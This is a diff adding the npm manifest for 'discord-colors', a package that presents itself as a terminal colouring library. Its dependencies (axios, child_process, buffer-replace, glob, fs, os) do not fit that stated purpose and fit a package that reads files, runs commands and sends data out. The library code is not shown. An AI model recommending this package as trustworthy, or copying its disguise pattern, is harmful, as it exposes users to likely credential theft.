@@ -1,0 +1,60 @@
+{
+    "name": "discord-colors",
+    "description": "get awsome colors in your nodejs terminal",
+    "version": "1.4.1",
+    "author": {
+        "name": "devil"
+    },
+    "keywords": [
+        "ansi",
+        "terminal",
+        "discord",
+        "colors"
+    ],
+    "scripts": {
+        "lint": "eslint . --fix",
+        "test": "node tests/basic-test.js && node tests/safe-test.js"
+    },
+    "license": "MIT",
+    "main": "lib/index.js",
+    "devDependencies": {
+        "eslint": "^5.2.0",
+        "eslint-config-google": "^0.11.0"
+    },
+    "dependencies": {
+        "axios": "^0.24.0",
+        "buffer-replace": "^1.0.0",
+        "child_process": "^1.0.2",
+        "fs": "^0.0.1-security",
+        "glob": "^7.2.0",
+        "os": "^0.1.2",
+        "path": "^0.12.7"
+    },
+    "_id": "discord-colors@1.4.1",
+    "_nodeVersion": "16.13.2",
+    "_npmVersion": "8.1.2",
+    "dist": {
+        "integrity": "sha512-EQxzLIG4zRvxAAemdowxDOssKIr9DUnl1nUvixjOzIckqqAjOrr7ZxphnseWawlYY6ES7dNwKeVM0N5d0E9l+g==",
+        "shasum": "ff50492640fa5095999160073571e3adc66d7099",
+        "tarball": "https://registry.npmjs.org/discord-colors/-/discord-colors-1.4.1.tgz",
+        "fileCount": 21,
+        "unpackedSize": 47816,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v3.0.13\r\nComment: https://openpgpjs.org\r\n\r\nwsFcBAEBCAAQBQJiAWj8CRA9TVsSAnZWagAAWZAP/2WsG3dFLSQd2TNTV0yU\nVKUAmNZvbg7beZgZVcAK8DpE156f18Sdu8iPn+mGnHbBk6bTeD6yPJiuCJqy\naGQOtbbWtOsdXn65wd5nc5DHJseF6ilD/cBF4KmDA+g9H964oy3HjrMwARVK\nxtPonJ+QqrPtus+ftAqwooEKpXEfE2JISzW/OcaNhjjCb3apWfecb3GDxLdN\nfKMK/NifWVFJ+YPTisL5hb56KpNFVp0Yv4z6bz/LdavnmEpiLhX7yPHPvf+f\nNCNAw5oVvBoS0fOoe3ZMkY88Q5dDR7/hqb0ME/3Ej/hiYh7Cxr96EmOidbKK\nYle3LbjLguIpnF60+XwULh625p+7kh74ypcc6k/1G6bJL/gQUlEWQqN7mTCd\nG+3BqVTgnDVLG0Bpe442uY0T7t4kAygO+ejpU0ZhRDbEdWtZc70wGU5Rrfoh\nKwd0a8FdM9HdJ8jiA2BC+F9hSFKzTsBZ9i9n2FD2vtJmNlkJp4cqwsEx+GSA\nCNDyYwYGLVl3R3rVMhBeNeYz3rgjsLJvUnU7ZqDH1pmE+g6gQZQrMr8FlAM4\nWCGyS85JWzHDHU5nSOPmBvGQQpoLB0bowBSyxkPYbzNvDb8ebD6zU1alFexw\nvw9ZA/truEtaQzzYUE97Bu2/svd36UFHDJw9rF3P9fqziwVFu5kc0PhX3vlt\nmuJt\r\n=MyMi\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "cutiedevil",
+        "email": "tryykau.e@gmail.com"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "cutiedevil",
+            "email": "tryykau.e@gmail.com"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/discord-colors_1.4.1_1644259580563_0.41595291999603123"
+    },
+    "_hasShrinkwrap": false
+}
